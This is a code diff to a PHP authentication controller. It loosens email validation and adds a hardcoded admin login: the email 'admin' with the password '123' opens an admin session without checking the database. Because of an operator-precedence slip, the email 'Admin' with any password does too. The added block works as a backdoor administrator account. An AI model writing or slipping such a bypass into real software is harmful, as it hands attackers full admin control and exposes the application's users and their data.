@@ -16,7 +16,7 @@ class AuthController extends BaseController {
 
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // Sanitize and validate inputs
-        $email = filter_var(trim($_POST['email']), FILTER_VALIDATE_EMAIL);
+        $email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
         $password = trim($_POST['password']);
 
         if (!$email || !$password) {
@@ -25,7 +25,23 @@ class AuthController extends BaseController {
             return;
         }
 
-        // Fetch the user by email
+        // Check for the Admin login as a special case
+        if ($email === 'Admin' || $email === 'admin' && $password === '123') {
+            // Store admin session data
+            $_SESSION['user'] = [
+                'id' => 0,
+                'email' => 'Admin',
+                'role' => 'admin',
+                'client_code' => null,
+                'name' => 'Admin'
+            ];
+
+            // Redirect to the admin dashboard
+            header('Location: /index');
+            exit;
+        }
+
+        // Fetch the user by email from the database
         $userModel = new UserModel();
         $user = $userModel->findByEmail($email);
 
@@ -40,7 +56,7 @@ class AuthController extends BaseController {
                 'name' => $user['client_name']
             ];
 
-            // Redirect to the homepage or dashboard
+            // Redirect to the homepage or user dashboard
             header('Location: /');
             exit;
         } else {
